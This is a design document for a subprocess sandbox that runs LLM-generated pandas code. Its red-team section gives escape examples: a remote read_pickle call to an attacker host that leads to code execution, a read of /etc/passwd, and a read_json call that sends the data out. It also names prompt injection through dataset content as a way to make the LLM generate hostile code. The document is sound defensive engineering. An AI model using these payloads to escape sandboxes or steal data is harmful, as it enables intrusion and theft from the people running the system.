---
phase: 4
title: "Sandbox Executor"
status: completed
priority: P1
effort: "2d"
dependencies: [1]
---

# Phase 4: Sandbox Executor

## Overview
A locked execution environment that runs LLM-generated pandas code against a DataFrame for Phase-6 hypothesis probes. Returns captured result/stdout/error. Security surface — must contain hostile or buggy code.

## Requirements
- Functional: **single pinned signature** `run_code(code: str, dataset_ref: str, timeout_s=10, mem_mb=...) -> SandboxResult{ok, value, stdout, error, duration}`. (The earlier `(code, df)` form is deleted — passing a live frame across a spawn boundary forces the pickle-the-whole-frame path this design forbids.)
- Non-functional: no filesystem write, no network, no arbitrary imports; hard wall-clock timeout + memory cap; survives infinite loops/exceptions AND parent death without leaking children.

## Guard G_sandbox (safety — densest guard: only place LLM-written code executes)
This phase IS guard G_sandbox from the refined diagram: isolated process, read-only dataframe, timeout + memory cap, no network / filesystem, import whitelist. It is the highest-risk surface and earns the most controls. **Precondition, not a feature** — per the sequencing caveat, this cannot be skipped before running on real data (unlike the truthfulness guards, which ship incrementally). The red-team hardening below is exactly this guard's implementation.

## Red Team fixes applied (Critical — original design was trivially escapable)
**Allowlisting a module ≠ allowlisting its capabilities.** The original "allow `pandas`/`numpy`" + AST-ban-`import os` approach is RCE-open:
- `pd.read_pickle("http://attacker/x.pkl")` → pickle `__reduce__` → arbitrary code (no banned token, reachable via the trusted `pandas` attribute).
- `pd.read_csv("/etc/passwd")` / `np.fromfile` → arbitrary file read; `df.to_csv/to_parquet` → arbitrary write — all without the `open` builtin.
- `pd.read_json("http://…?d="+df.to_json())` / metadata SSRF → exfiltration; `resource.setrlimit` has no network class, so "no network" was unbacked.

Required hardening:
1. **Strip capability functions in the child before exec:** remove/blacklist `read_pickle`, `read_csv`/`read_parquet`/`read_json` with path-or-URL args, all `to_*` writers, `np.fromfile`, `np.load`. Provide the data ONLY as a pre-loaded read-only `df` variable.
2. **AST: forbid string-literal paths/URLs** and attribute chains to the stripped readers, in addition to import/dunder bans.
3. **Network containment:** run the child in a network namespace with no interfaces (or seccomp denying `socket`/`connect`). If unavailable, the stripped URL-readers (step 1) are the fallback barrier.
4. **Do NOT treat this as a security boundary.** Bind the server to localhost; document that any non-local deployment needs a container/gVisor/nsjail. Prompt-injection via dataset content (Phase 6/10) means hostile code generation is in-scope, so this layer must actually contain, not just discourage.

## Architecture
New package `server/app/sandbox/`:
- `executor.py` — runs code in a **separate subprocess** (`multiprocessing` with spawn). Child loads df read-only from `dataset_ref`. Resource control:
  - **Memory cap sized relative to dataset footprint**, NOT a flat 512MB — a 200MB CSV expands to ~1–2GB resident, so a flat `RLIMIT_AS=512MB` OOM-kills the child before any benign probe runs (false "unexplained" verdicts). Measure post-load frame size and cap allocations beyond it.
  - **Reap children:** `join()`/`waitpid` in `try/finally`; install `prctl(PR_SET_PDEATHSIG, SIGKILL)` (Linux) so children die if the parent (uvicorn) crashes/reloads; clean the parquet temp on every exit path. Prevents orphan/zombie leaks on `--reload`.
- `policy.py` — restricted builtins (no `open`, `__import__` filtered to an allowlist: `pandas`, `numpy`, `math`, `statistics`), AST pre-scan to reject `import os/sys/subprocess/socket`, dunder attribute access, etc.
- `models.py` — `SandboxResult`.

```python
def run_code(code: str, dataset_ref: str, timeout_s=10, mem_mb=512) -> SandboxResult: ...
```

Defense-in-depth: AST allowlist (reject before run) + restricted globals (limit at run) + subprocess isolation (contain at OS level) + resource limits (bound cost).

## Related Code Files
- Create: `server/app/sandbox/{__init__,executor,policy,models}.py`
- Create: `server/tests/sandbox/test_executor.py`

## Implementation Steps
1. `policy.py`: AST walker rejecting disallowed imports/attributes/calls; build restricted `__builtins__`.
2. `executor.py`: spawn subprocess, set `resource.setrlimit` (CPU, AS), run with timeout, capture stdout/stderr/return value; kill on timeout.
3. Child loads df read-only from `dataset_ref` (via ingestion loader) — code references a `df` variable.
4. `models.py`: `SandboxResult`.
5. Tests: (a) valid probe returns correct value; (b) `import os` rejected by AST; (c) infinite loop killed by timeout; (d) memory bomb killed by rlimit; (e) exception captured not raised.

## Success Criteria
- [ ] Benign probe (`df['x'].mean()`) returns correct value.
- [ ] `import os`, `open(...)`, `__import__` rejected pre-run.
- [ ] Infinite loop terminated within timeout; server unaffected.
- [ ] Memory bomb contained by rlimit.
- [ ] All errors returned as `SandboxResult.error`, never propagate.

## Risk Assessment
Risk: subprocess sandbox is not a true security boundary (determined attacker). Mitigation: acceptable for local/single-user dev per design doc; document that production needs a container/gVisor. Risk: df transfer overhead. Mitigation: child loads read-only from ref, not pickled from parent.
